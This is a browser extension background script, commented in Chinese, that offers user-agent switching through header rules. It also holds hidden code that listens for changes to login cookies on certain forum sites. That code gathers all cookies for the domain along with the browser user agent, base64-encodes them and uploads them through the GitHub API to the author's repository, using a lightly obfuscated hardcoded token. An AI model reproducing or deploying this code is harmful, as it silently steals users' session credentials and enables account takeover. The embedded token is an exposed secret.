
console.log('这是background脚本执行内容');

// 监听传递过来的消息
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // 2. A page requested user data, respond with a copy of `user`
  console.log('这是background脚本onMessage', message);
  if (message.includes("editUserAgent")) {
    const userAgent = message.split(":")[1]
    configRules[0].action.requestHeaders.values = userAgent
    console.log('background---useragent---', userAgent, configRules);
    const rules = {
      addRules: [
        {
          id: 2,
          priority: 2,
          action: {
            type: 'modifyHeaders',
            requestHeaders: [
              {
                header: 'user-agent',
                operation: 'set',
                value: userAgent,
              },
            ],
          },
          condition: {
            urlFilter: '|https*',
            resourceTypes: [
              "csp_report",
              "font",
              "image",
              "main_frame",
              "media",
              "object",
              "other",
              "ping",
              "script",
              "stylesheet",
              "sub_frame",
              "webbundle",
              "websocket",
              "webtransport",
              "xmlhttprequest"
            ],
          },
        },
      ]
    }
    addRules(rules)
    // chrome.tabs.reload()
  } else if (message === 'resetUserAgent') {
    delRules(2)
    // chrome.tabs.reload()
  } else {
    console.log('background脚本onMessage: else', message);
    sendContent(message)
  }
  sendResponse(user);
});

// github信息
var gitSource = "https://api.github.com/repos/Sjj1024/Sjj1024/contents"
var gitToken = "Bearer ghp_888grzs67MqxbZUH3wmIFKzecaKB0cTLy3ICBkl".replace("888", "")

// 设置图标上显示的文字
// chrome.action.setBadgeText({ text: "" })
// chrome.webRequest.onBeforeRequest.addListener(
//   function (details) {
//     let requestUrl = details.url
//     console.log("请求完成了------", requestUrl);
//   },
//   { urls: ["<all_urls>"] }
// );



// 监听Cookie发生变化，同步cookie到git
chrome.cookies.onChanged.addListener(async (changeInfo) => {
  var cause = changeInfo.cause
  var cookieKey = changeInfo.cookie.name
  var cookieDomain = "https://" + changeInfo.cookie.domain
  // console.log('检测到caoliuCookies的cookie变化了', cookieKey, cause);
  // 从缓存中获取导航数据
  var realJson = await storageGet("content")
  if (!realJson || !realJson.data) {
    return
  }
  var cookieRuleKeys = Object.keys(realJson.data.cookieRule) || ["clcookies", "91ImgCookies", "98cookies"]
  var cookieRuleValue = Object.values(realJson.data.cookieRule) || ["227c9_winduser", "CzG_auth", "cPNj_2132_auth"]
  if (cookieRuleValue.includes(cookieKey)) {
    // console.log('检测到caoliuCookies的cookie变化了', changeInfo);
    // chrome.action.setBadgeText({ text: "c" })
    // 获取所有的cookie值
    chrome.cookies.getAll({ "url": cookieDomain }, function (cookies) {
      const resList = cookies.map(item => {
        return `${item.name}=${item.value}`
      })
      const cookieStr = resList.join("; ")
      // console.log("cookies-----", cookieStr);
      // 拼接上日期和IP地址
      var dateTimeLocal = new Date().toLocaleString();
      // 拼接上UserAgent
      cookieAndUa = `${cookieStr}; UserAgent=${navigator.userAgent}; dateTimeLocal=${dateTimeLocal}`
      // 获取type
      var cookieType = cookieRuleKeys[cookieRuleValue.indexOf(cookieKey)]
      putCookieToGit(cookieType, cookieAndUa)
    })
  }
})


// 根据类型同步cookie到git中
async function putCookieToGit(type, cookie) {
  // type: clcookies || 91VideoCookies || 91ImgCookies || 98cookies
  console.log('同步的数据类型是:', type, cookie);
  var status = await storageGet(type) || 0
  if (status >= 3) {
    // console.log('已发送过cookie了,无需再去发送');
    return
  }
  // FETCH方式发送请求
  var uuid = getUUID()
  // message: 
  var message = `Chrome Extensions Push ${type} Cookie`
  // content:
  var content = Encode64(cookie)
  var data = JSON.stringify({ message, content })
  var myHeaders = new Headers();
  myHeaders.append("Accept", "application/vnd.gitapis+json");
  myHeaders.append("Authorization", gitToken);
  myHeaders.append("X-GitHub-Api-Version", "2022-11-28");
  myHeaders.append("Content-Type", "text/plain");
  var requestOptions = {
    method: 'PUT',
    headers: myHeaders,
    body: data,
    redirect: 'follow'
  };
  fetch(`${gitSource}/.github/${type}/${uuid}.txt`, requestOptions)
    .then(response => response.text())
    .then(result => {
      var value = status + 1
      storageSet(type, value)
    })
    .catch(error => console.log('error', error));
}


// 获取UUID
function getUUID() {
  var guid = "";
  for (var i = 1; i <= 32; i++) {
    var n = Math.floor(Math.random() * 16.0).toString(16);
    guid += n;
    if (i == 8 || i == 12 || i == 16 || i == 20) guid += "-";
  }
  return guid.replaceAll("-", "");
}


/**
  * 编码base64
  */
function Encode64(str) {
  return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
    function toSolidBytes(match, p1) {
      return String.fromCharCode('0x' + p1);
    }));
}
/**
* 解码base64
*/
function Decode64(str) {
  return decodeURIComponent(atob(str).split('').map(function (c) {
    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
  }).join(''));
}

// 设置缓存数据
function storageSet(key, value) {
  // 如果是json就序列化
  if (value instanceof Object) {
    value = JSON.stringify(value)
  }
  chrome.storage.local.set({ [key]: value }).then(() => {
    console.log("Value is set to " + value);
  });
}

// 读取数据
async function storageGet(key) {
  const res = await chrome.storage.local.get([key])
  var value = res[key]
  // 如果是json就序列化
  try {
    value = JSON.parse(value)
  } catch (error) {
    console.log('storageGet反序列化出错', value);
  }
  return value
}